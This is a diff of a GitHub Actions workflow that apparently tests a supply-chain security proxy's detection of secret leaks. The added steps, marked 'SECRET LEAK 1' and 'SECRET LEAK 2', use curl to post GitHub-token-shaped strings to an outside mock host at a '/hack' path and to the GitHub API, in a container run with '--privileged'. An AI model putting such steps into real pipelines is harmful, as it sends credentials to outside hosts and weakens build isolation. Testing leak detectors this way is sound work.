@@ -1,4 +1,4 @@
-name: Build NPM Package
+name: Build JS Package For Secrets
 on:
   push:
     branches: [ main ]
@@ -10,7 +10,7 @@ permissions:
   contents: read
   packages: read
 env:
-  API_URL: https://app.stage.invisirisk.com/
+  API_URL: https://app.stage.veribom.com
 
 jobs:
   create_scan_in_IR_Portal:
@@ -58,24 +58,28 @@ jobs:
     needs: [create_scan_in_IR_Portal, ecr_details]
     services:
       pse:
-        image: 282904853176.dkr.ecr.us-west-2.amazonaws.com/invisirisk/pse-proxy:latest
+        image: 282904853176.dkr.ecr.us-west-2.amazonaws.com/invisirisk/pse-proxy:dev-test
         credentials:
           username: ${{needs.ecr_details.outputs.ecr_username}}
           password: ${{needs.ecr_details.outputs.ecr_token}}
         env:
           PSE_DEBUG_FLAG: --alsologtostderr
           POLICY_LOG: t
-          INVISIRISK_JWT_TOKEN: ${{secrets.VB_API_KEY_STAGE}} 
-          INVISIRISK_PORTAL:  https://app.stage.invisirisk.com/
+          INVISIRISK_JWT_TOKEN: ${{secrets.VB_API_KEY_STAGE}}
+          INVISIRISK_PORTAL: https://app.stage.veribom.com
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} 
-          POLICY_AUTH_TOKEN: ${{secrets.VB_API_KEY_STAGE}}
     container:
-      image: node:18-alpine
-      options: --cap-add=NET_ADMIN
+      image: node:18-buster
+      options: --cap-add=NET_ADMIN --privileged
     strategy:
       matrix:
         node-version: [18.x]
     steps:
+    - name: Install curl
+      run: |
+        apt-get update
+        apt-get install -y curl
+      
     - env: 
         SCAN_ID: ${{ needs.create_scan_in_IR_Portal.outputs.scan_id }}
       run: echo $SCAN_ID
@@ -89,6 +93,21 @@ jobs:
       uses: actions/setup-node@v3
       with:
         node-version: ${{ matrix.node-version }}
-    - run: npm install --no-optional --legacy-peer-deps
 
+    - name: Send POST request with GitHub token (SECRET LEAK 1)
+      run: |
+          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
+            -H "Content-Type: application/json" \
+            -d '{
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
+    - name: Make API Request (SECRET LEAK 2)
+      run: |
+        curl -k -X POST https://api.github.com/endpoint \
+        -d '{"name": "ghp_1234567890abcdef1234567890abcdef12345678", "description": "A description of my repository"}'
         
+    - name: install dependencies
+   # run: pip install -r requirements.txt
+      run: npm install
+    # - run: npm run build --if-present
+    # - run: npm test
